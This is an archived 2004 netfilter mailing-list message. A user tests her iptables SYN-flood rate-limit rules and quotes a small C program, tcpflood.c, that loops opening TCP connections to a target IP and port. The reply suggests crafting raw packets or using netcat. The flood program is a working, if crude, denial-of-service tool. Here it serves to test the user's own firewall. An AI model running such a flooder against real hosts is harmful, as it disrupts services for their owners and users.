From: "Daniel Chemko" <dchemko@smgtec.com>
Subject: RE: How to test synflood prevention
Date: Mon, 16 Feb 2004 14:55:46 -0800
Sender: netfilter-admin@lists.netfilter.org
Message-ID: <7C9884991ADAE0479C14F10C858BCDF567917A@alderaan.smgtec.com>
Mime-Version: 1.0
Content-Transfer-Encoding: quoted-printable
Return-path: <netfilter-admin@lists.netfilter.org>
content-class: urn:content-classes:message
Errors-To: netfilter-admin@lists.netfilter.org
List-Help: <mailto:netfilter-request@lists.netfilter.org?subject=help>
List-Post: <mailto:netfilter@lists.netfilter.org>
List-Subscribe: <https://lists.netfilter.org/mailman/listinfo/netfilter>,
	<mailto:netfilter-request@lists.netfilter.org?subject=subscribe>
List-Id: <netfilter.vger.kernel.org>
List-Unsubscribe: <https://lists.netfilter.org/mailman/listinfo/netfilter>,
	<mailto:netfilter-request@lists.netfilter.org?subject=unsubscribe>
List-Archive: <https://lists.netfilter.org/pipermail/netfilter/>
Content-Type: text/plain; charset="us-ascii"
To: Peggy Kam <ppkam@n-dsi.com>, netfilter@lists.netfilter.org

Try using raw sockets and cook your own headers, or just use tools that
are designed for it, like netcat

Peggy Kam wrote:
> Hi,
>=20
> I have set up some rules for preventing the synflood attack, ie:
>=20
> iptables -A SYN_FLOOD -m limit --limit 2/s --limit-burst 4 -j ACCEPT
> iptables -A SYN_FLOOD -j DROP
> iptables -A SYN_FLOOD -i eth1 -p tcp ! --syn -m state --state NEW -j
> DROP=20
>=20
> However, the firewall does not seem to filter any packets.  I have
> used=20
> the following tcpflood.c program to generate the flood, however, when
> I used tcpdump and checked the message log with the firewall with and
> without the above rules, they gave me the same results.  So, may I ask
> how I can test the firewall for DoS attack?
>=20
> Thanks in advance,
> Peggy
>=20
>=20
>=20
> #tcpflood.c
>=20
> #include <unistd.h>
> #include <stdio.h>
> #include <netdb.h>
> #include <stdlib.h>
> #include <string.h>
> #include <unistd.h>
> #include <sys/socket.h>
> #include <netinet/in.h>
> #include <arpa/inet.h>
> #include <sys/types.h>
>=20
>=20
> int main(int argc, char **argv) {
>=20
>   struct sockaddr_in to_addr;
>   int s;
>=20
>   bzero(&to_addr, sizeof(to_addr));
>   to_addr.sin_family=3DAF_INET;
>=20
>=20
>   if ( argc =3D=3D 3 ) {
>         to_addr.sin_addr.s_addr=3Dinet_addr(argv[1]);
>         to_addr.sin_port=3Dhtons(atoi(argv[2]));
>   }
>=20
>   else {
>         fprintf(stderr, "Usage: %s <IP> <PORT>\n", argv[0]);
>         return 1;
>   }
>=20
>   printf("Flooding  %s:%d ...\n", argv[1], atoi(argv[2]));
>=20
>   while (1) {
>=20
>         if ((s =3D socket(PF_INET, SOCK_STREAM, 0)) < 0) {
>                 fprintf(stderr, "Error: socket()\n");
>                 return 1;
>         }
>=20
>         if ((connect(s, (struct sockaddr *)&to_addr, sizeof to_addr))
>                 < 0) { perror("connect()");
>                 return 1;
>         }
>=20
>=20
>         printf(".");
>         fflush(stdout);
>         close(s);
>=20
>   }
>=20
>   return 0;
>=20
> }

